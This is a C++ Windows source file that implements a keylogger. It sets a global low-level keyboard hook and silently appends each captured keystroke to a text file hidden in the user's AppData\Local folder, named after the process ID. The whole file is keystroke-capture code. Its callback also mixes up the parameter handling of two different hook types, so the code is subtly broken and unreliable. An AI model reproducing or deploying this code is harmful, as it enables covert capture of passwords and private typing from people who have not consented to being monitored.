// Hook2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>

using namespace std;

#ifndef _CRT_STRINGIZE  // Might be already defined in crtdefs.h, but if not...
#define __CRT_STRINGIZE(Value) #Value
#define _CRT_STRINGIZE(Value) __CRT_STRINGIZE(Value)
#endif

HHOOK hook;


void error(DWORD retval) {
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}
LRESULT __stdcall Callback(int nCode, WPARAM wParam, LPARAM lParam) {
	char ch;
	DWORD processID = GetCurrentProcessId();
	string home_dir = getenv("HOMEPATH");
	string file_loc = "C:\\";
	FILE *f;
	file_loc.append(home_dir);
	file_loc.append("\\Appdata\\Local\\");
	file_loc.append(to_string(processID));
	file_loc.append(".txt");
	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			fopen_s(&f, file_loc.c_str(), "a+");
			if (wParam == VK_RETURN)
			{
				ch = '\n';
				fwrite(&ch, 1, 1, f);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = char(w);
				fwrite(&ch, 1, 1, f);
			}
			fclose(f);
		}
	}
	//HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)keyboardProc, GetCurrentModuleHandle(), 0);
	LRESULT RetVal = CallNextHookEx(hook, nCode, wParam, lParam);
	return  RetVal;
}

void InstallHook()
{
	
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0))) {
		cout << "Failed to hook!" << endl;
	}
}
int main()
{
	InstallHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {

	}

	return 0;
}


